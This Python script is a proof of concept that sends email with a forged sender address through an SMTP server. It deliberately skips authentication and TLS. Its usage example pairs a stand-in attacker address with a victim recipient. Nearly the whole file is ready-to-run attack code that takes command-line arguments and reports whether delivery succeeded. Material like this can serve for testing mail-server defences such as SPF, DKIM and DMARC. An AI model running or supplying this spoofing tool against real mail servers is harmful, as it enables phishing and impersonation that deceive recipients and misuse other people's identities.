#!/usr/bin/env python3
"""
Proof-of-Concept: Sender Address Spoofing via MAIL FROM

This script demonstrates the inherent lack of sender authentication in the SMTP protocol
as described in RFC 5321. It connects to an SMTP server and initiates a mail transaction
using a forged sender address in the MAIL FROM command.

Vulnerability: SMTP does not inherently validate the sender address in the MAIL FROM command.
If the server does not enforce SPF/DKIM/DMARC or require SMTP AUTH, it will accept the
transaction, allowing the attacker to send emails that appear to originate from the spoofed address.

Usage:
    python poc_sender_address_spoofing_via_mail_from.py <smtp_server> <port> <spoofed_sender> <recipient>

Example:
    python poc_sender_address_spoofing_via_mail_from.py smtp.target.com 25 attacker@evil.com victim@target.com
"""

import sys
import smtplib
from email.mime.text import MIMEText


def send_spoofed_email(smtp_server, port, spoofed_sender, recipient, subject="Spoofed Test Email", body="This email was sent with a forged sender address."):
    """
    Connects to an SMTP server and sends an email with a forged sender address.
    
    Args:
        smtp_server (str): The hostname or IP address of the SMTP server.
        port (int): The port number of the SMTP server (usually 25, 587, or 465).
        spoofed_sender (str): The forged sender email address.
        recipient (str): The recipient email address.
        subject (str): The subject of the email.
        body (str): The body of the email.
    
    Returns:
        bool: True if the email was sent successfully, False otherwise.
    """
    # Create the email message
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = spoofed_sender
    msg['To'] = recipient

    try:
        # Connect to the SMTP server
        # Note: We do not use login() or starttls() to demonstrate the raw protocol behavior
        # and to avoid triggering authentication requirements.
        server = smtplib.SMTP(smtp_server, port, timeout=10)
        server.set_debuglevel(1)  # Enable debug output to see the SMTP conversation

        # Step 1: Initiate the mail transaction with the forged sender address
        # RFC 5321 Section 3.3: "The transaction starts with a MAIL command that gives the sender identification."
        # The server is expected to accept this without validating the sender's identity.
        server.mail(spoofed_sender)

        # Step 2: Specify the recipient
        server.rcpt(recipient)

        # Step 3: Send the email data
        server.data(msg.as_string())

        # Step 4: Close the connection
        server.quit()

        print(f"[+] Successfully sent spoofed email from {spoofed_sender} to {recipient}")
        return True

    except smtplib.SMTPRecipientsRefused as e:
        print(f"[-] Recipient refused: {e}")
        return False
    except smtplib.SMTPSenderRefused as e:
        print(f"[-] Sender refused: {e}")
        return False
    except smtplib.SMTPDataError as e:
        print(f"[-] Data error: {e}")
        return False
    except smtplib.SMTPException as e:
        print(f"[-] SMTP error: {e}")
        return False
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return False


if __name__ == "__main__":
    if len(sys.argv) != 5:
        print(f"Usage: {sys.argv[0]} <smtp_server> <port> <spoofed_sender> <recipient>")
        sys.exit(1)

    smtp_server = sys.argv[1]
    port = int(sys.argv[2])
    spoofed_sender = sys.argv[3]
    recipient = sys.argv[4]

    print(f"[*] Attempting to send spoofed email from {spoofed_sender} to {recipient} via {smtp_server}:{port}")
    send_spoofed_email(smtp_server, port, spoofed_sender, recipient)
